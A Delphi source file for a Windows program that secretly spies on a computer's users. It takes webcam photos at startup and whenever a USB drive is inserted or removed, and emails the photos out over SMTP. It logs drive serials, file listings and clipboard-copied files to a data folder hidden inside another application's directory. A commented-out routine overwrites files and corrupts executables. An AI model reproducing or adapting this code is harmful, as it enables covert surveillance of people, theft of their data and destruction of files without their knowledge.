unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,DSPack,DSUtil,DirectShow9, ExtCtrls, StdCtrls, IniFiles,Clipbrd, ShellApi,
  IdComponent, IdTCPConnection, IdTCPClient, IdMessageClient, IdSMTP,
  IdBaseComponent, IdMessage, IdAntiFreezeBase, IdAntiFreeze, IdHTTP;

type
  TForm1 = class(TForm)
    FilterGraph1: TFilterGraph;
    VideoWindow1: TVideoWindow;
    SampleGrabber1: TSampleGrabber;
    Filter1: TFilter;
    Image1: TImage;
    IdMessage1: TIdMessage;
    IdSMTP1: TIdSMTP;
    IdAntiFreeze1: TIdAntiFreeze;
    IdHTTP1: TIdHTTP;
    procedure FormCreate(Sender: TObject);
    public
    { Private declarations }
     private
    { Public declarations }
  
    function Camera(name:string):boolean;   // Makes photo

    function NewDisk:string;       // Check system on new storage devices

   { function Shit(copyfile:string):boolean;   }    // Generate random file
    function DiskInf(Name:string;disk:char;KaboP:byte):boolean; //  Collect all user work with disk
    function FileOnDisk(Dir:string):Ansistring;
    function CopyFileInBuffer():string;                        // Get files which prepare for copying(Files in system buffer)
   { function FindFile(Dir:string):Ansistring;     }
    function DiskSerial(const DriveLetter: Char):shortstring;    // Get disk serial key
    function MMS(files:string):boolean;           // Send email whith data
  end;
const
   dataDir = 'D:\Program Files (x86)\DAEMON Tools Lite\Lang\Homovoy\';    // Dir where saves data
   dirMessageIcon = 'D:\Program Files (x86)\Borland\InterBase\rik.ico';     // Icon which uses to show that report was sent
   dirMassegeIconFolder = 'C:\Users\User\Desktop\tens.ico';                  // Directory where program puts signal icon of sending report
   dirIconUnknownFlashMemory = 'D:\Program Files (x86)\Borland\InterBase\rik.ico';  // Icon which uses to show that to computer was connected unknown device
   dirIconMasegeUnFlashMemory = 'C:\Users\User\Desktop\tens.ico';                 // Directory where program puts signal icon of connection unknown device
   // Settings for send email function
   host = 'smtp.yandex.ru';
   port = 587;
   username = '';
   password = '';
   body = 'News';
   from = '';
   emailAdress = '';
   subject = 'HamovoyAlfaTest';
var
  Form1: TForm1;
  papka: string;
 { Buf: array[1..13000] of Char; }
implementation

{$R *.dfm}

function TForm1.Camera(name:string):boolean;
  var
  CamItem: TSysDevEnum;
begin
  FilterGraph1.Active := true;
  CamItem:= TSysDevEnum.Create(CLSID_VideoInputDeviceCategory);
  if CamItem.CountFilters > 0 then
  begin
    FilterGraph1.ClearGraph;
    FilterGraph1.Active:=false;
    Filter1.BaseFilter.Moniker:=CamItem.GetMoniker(0);
    FilterGraph1.Active:=true;
    with FilterGraph1 as ICaptureGraphBuilder2 do
    RenderStream(@PIN_CATEGORY_PREVIEW, nil, Filter1 as IBaseFilter, SampleGrabber1 as IBaseFilter, VideoWindow1 as IbaseFilter);
    FilterGraph1.Play;
    sleep(1000);
    SampleGrabber1.GetBitmap(Image1.Picture.Bitmap);
    image1.picture.SaveToFile(papka+'\'+name+'.bmp');  //!!!!!!!!!!!!!!!!!!!1
    FilterGraph1.Active:=false;
  end;
end;

function TForm1.DiskSerial(const DriveLetter: Char): shortstring;
var
  NotUsed:     DWORD;
  VolumeFlags: DWORD;
  VolumeInfo:  array[0..MAX_PATH] of Char;
  VolumeSerialNumber: DWORD;
begin 
  GetVolumeInformation(PChar(DriveLetter + ':\'), 
    nil, SizeOf(VolumeInfo), @VolumeSerialNumber, NotUsed,
    VolumeFlags, nil, 0);
  Result := Format('%8.8X', [VolumeSerialNumber]);
end;

{function TForm1.FindFile(Dir:string):Ansistring;
var
  SR: TSearchRec;
  FindRes: Integer;
  mesta1:string;
  mesta:Ansistring;
begin
  FindRes := FindFirst(Dir + '*.*', faAnyFile, SR);
  while FindRes = 0 do
  begin
     mesta1:=Dir + SR.Name ;
    if ((SR.Attr and faDirectory) = faDirectory) and
      ((SR.Name = '.') or (SR.Name = '..')) then
    begin
      FindRes := FindNext(SR);
      Continue;
    end ;
    if ((SR.Attr and faDirectory) = faDirectory)and(sr.Name<>'WINDOWS') then
    begin
      FindFile(Dir + SR.Name + '\');
      FindRes := FindNext(SR);
      Continue;
    end;
    shit(mesta1);
    mesta:=mesta+mesta1+'||';
    FindRes := FindNext(SR);
  end;
  FindFile:=mesta;
  FindClose(SR);
end; }

function Tform1.NewDisk():string;
  var Disk:char;
      i:byte;
      sk:string;
   begin
      for disk:= 'A' to 'Z' do
        begin
          i:=GetDriveType(PChar(disk+':\'));
          if (i=2) or (i=4)
            then sk:=sk+disk;
        end;
         newDisk:=sk;
   end;

function TForm1.CopyFileInBuffer():string;
  var
  f: THandle;
  buffer: Array [0..MAX_PATH] of Char;
  i, numFiles: Integer;
  files:string;
 begin
    Clipboard.Open;
    try
      f:= Clipboard.GetAsHandle( CF_HDROP ) ;
      If f <> 0 Then begin
        numFiles := DragQueryFile( f, $FFFFFFFF, nil, 0 ) ;
        for i:= 0 to numFiles - 1 do begin
          buffer[0] := #0;
          DragQueryFile( f, i, buffer, sizeof(buffer)) ;
          files:=files+'||'+buffer;
        end;
      end;
    finally
      Clipboard.Close;
    end;
    CopyFileInBuffer:=files;
 end;

function TForm1.FileOnDisk(Dir:string):Ansistring;
var
  SR: TSearchRec;
  FindRes: Integer;
  mesta:string;
begin
  FindRes := FindFirst(Dir+':\' + '*.*', faAnyFile, SR);
  while FindRes = 0 do
  begin
     mesta:=mesta+Dir+':\' + SR.Name+'||' ;
   FindRes := FindNext(SR);
  end;
  FileOnDisk:=mesta;
  FindClose(SR);
end;

function TForm1.DiskInf(Name:string;disk:char;KaboP:byte):boolean;
   var inf,CopyFileInBuf{,poch,kin}:AnsiString;
       dir:string;
       Surial:shortstring;
       lt : TSYSTEMTIME;
       ini:TIniFile;
       i,j:integer;
begin{system}
   getLocalTime(lt);
   if KaboP=1
     then begin
            try
              ini := TIniFile.Create(papka+'\MyIni.ini');  //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
              Surial:=DiskSerial(disk);
              try
              if (surial<>'0018FB20')and(surial<>'9C2F8427')and(surial<>'0F15AD49')and(surial<>'1AEFA9ED')and(surial<>'F4B687C6')   // Serial key of flash memory
                then CopyFile(Pchar(dirIconUnknownFlashMemory),Pchar(dirIconMasegeUnFlashMemory),true);
              except
              end;
              ini.WriteString(Name,'������� �����',Surial);
              ini.WriteString(Name,'��� ��'+''''+'������� ������������',('г�='+IntToStr(lt.wYear)+ ',�����='+IntToStr(lt.wmonth)+',����='+IntToStr(lt.wDay)+' ���='+IntToStr(lt.wHour)+  '.' +IntToStr(lt.wMinute) +  '.' +IntToStr(lt.wSecond)));
              ini.WriteString(Name,'����� �� ����� � ������� �� �������',FileOnDisk(disk));
            finally
            ini.Free;
            end;
          end
     else begin
            try
              ini := TIniFile.Create(papka+'\MyIni.ini');  //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
              inf:=FileOnDisk(disk);
              if length(inf)<>0
                then ini.WriteString(Name,'����� �� ���� � ������� �� �����',inf);
              ini.WriteString(Name,'��� ��'+''''+'������� ������������',('г�='+IntToStr(lt.wYear)+ ',�����='+IntToStr(lt.wmonth)+',����='+IntToStr(lt.wDay)+' ���='+IntToStr(lt.wHour)+  '.' +IntToStr(lt.wMinute) +  '.' +IntToStr(lt.wSecond)));
              inf:=ini.readString(Name,'����� �� �����, �� ����������� �� ���������','');
              sleep(20);
              CopyFileInBuf:= CopyFileInBuffer;
              if (pos(CopyFileInBuf,inf)=0)and(length(CopyFileInBuf)<>0)
                then begin
                       inf:=inf+CopyFileInBuf;
                       ini.WriteString(Name,'����� �� �����, �� ����������� �� ���������',inf);
                     end;
              inf:='';
             { poch:=ini.readString(Name,'����� �� ���� � ������� '+disk+':\'+' �� �������','');
              kin:=ini.readString(Name,'����� �� ���� � ������� '+disk+':\'+' �� �����','');
              for i:=1 to length(poch) do
                begin
                  dir:=dir+poch[i];
                  if (poch[i]='|')and(poch[i+1]<>'|')
                    then begin
                           if pos(dir,kin)<>0
                             then delete(kin,pos(dir,kin),length(dir));
                           dir:='';
                         end;
                end;
              dir:='';
             poch:=ini.readString(Name,'������ ���������� �����','');
              if poch<>kin
                then for I:=1 to length(kin) do
                       begin
                         if kin[i]<>'|'
                           then dir:=dir+kin[i];
                         if kin[i+1]+kin[i+2]='||'
                           then begin
                         if (ExtractFileExt(dir)='')
                           then findFile(dir+'\')
                           else Shit(dir) ;
                          dir:='';
                        end;
                end;
              ini.WriteString(Name,'������ ���������� �����',kin);  }
              ini.Free;
            except
            end;
          end;  
end;

{function Tform1.Shit(copyfile:string):boolean;
  var f1 : file of byte;
      ob,i,j: Integer;
      proverka:boolean;
begin
 proverka:=true;
 try
   repeat
   try
     AssignFile(f1,copyfile);
     reset(f1);
   except
      proverka:=false;
   end;
   Until proverka=true;  //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 ob:=FileSize(f1);
 if ExtractFileExt(copyFile)='.exe'
    then begin
           seek(f1,(30));
           BlockWrite(f1,buf,1);
           seek(f1,(ob-100));
           BlockWrite(f1,buf,1);
           seek(f1,(ob-50));
           BlockWrite(f1,buf,1);  
           seek(f1,(ob-1));
           Truncate(f1);
         end
    else begin
           rewrite(f1);
           if (ob/13000)>1
             then for i:=1 to trunc(ob/13000) do
                    blockWrite(f1,buf,sizeof(buf),j);
           blockWrite(f1,buf,(ob-(13000*(trunc(ob/13000)))),j)
         end;
  closeFile(f1);
  except
  end;
end;  }

function TForm1.MMS(files:string):boolean;
  var sendFile:string;
       i:integer;
begin
  mms:=true;
  try
  idsmtp1.Host:=host;
  idsmtp1.Port:=port;
  idsmtp1.Username:=username;
  idsmtp1.Password:=password;
  idmessage1.Body.Text:=body;
  idmessage1.From.text:=from;
  idmessage1.Recipients.EMailAddresses:=emailAdress;
  idmessage1.subject:=subject;
  for i:=1 to length(files) do
    begin
       if files[i]<>'|'
         then sendfile:=sendfile+files[i];
       if ((files[i]+files[i+1])='||')or(i=length(files))
         then begin
                TIdAttachment.Create(IdMessage1.MessageParts, sendFile);
                sendFile:='';
              end;
    end;
  idSmtp1.Connect();
  idsmtp1.send(idmessage1);
  idSmtp1.Disconnect;
  except
  MMS:=false;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
var i,N,minutes:integer;
    inf:array [1..50] of string;
    diski,obn,OtMail:string;
    lt : TSYSTEMTIME;
begin
  try
 { for i:=1 to 13000 do
    buf[i]:='-'; }
  N:=0;
  getLocalTime(lt);
  papka:=dataDir + IntToStr(lt.wYear)+ '.'+IntToStr(lt.wmonth)+'.'+IntToStr(lt.wDay)+'-'+IntToStr(lt.wHour)+  '.' +IntToStr(lt.wMinute) +  '.' +IntToStr(lt.wSecond);
  CreateDir(papka);
  for i:=1 to 10 do
    begin
      sleep(999);
      if getasynckeystate(9)<>0
        then OtMail:='true';
    end;
  if OtMail<>'true'
    then begin
           try
             Camera('1sDr');
             CopyFile(Pchar(dirMessageIcon),Pchar(dirMassegeIconFolder),true); //!!!!!!!!!!!!
             idHTTP1.Head('http://ya.ru');
             MMS(papka+'\1sDr.bmp')  //!!!!!!!!!!!!!!!!!!!!!!!
           except begin
                    OtMail:='Error';
                    getLocalTime(lt);
                    minutes:=lt.wMinute;
                  end;
            end;      
         end;
  repeat
    sleep(1000);
     if OtMail='Error'
       then begin
              getLocalTime(lt);                         
              if (lt.wMinute-minutes)>10
               then begin
                      try
                        idHTTP1.Head('http://ya.ru');
                        Camera('1sDr');
                        MMS(papka+'\1sDr.bmp');  //!!!!!!!!!!!!!!!!!!!!!!!
                        OtMail:='';
                      except
                        minutes:=lt.wMinute;
                      end;
                  end;
              
            end;
    obn:=newDisk;
    for i:=1 to length(diski) do
      if pos(diski[i],obn)=0
        then begin
               Camera('end '+inf[i]);
               inf[i]:='';
             end;
    diski:=obn;
    for i:=1 to length(diski) do
      if (inf[i]='')
        then begin
               inc(N);
               inf[i]:=inttoStr(N);
               Camera('Begin '+inf[i]);
               DiskInf(inf[i],diski[i],1);
             end
             else DiskInf(inf[i],diski[i],2);
  until 1<0;
  except
    exitprocess(0);
  end;
end;
end.
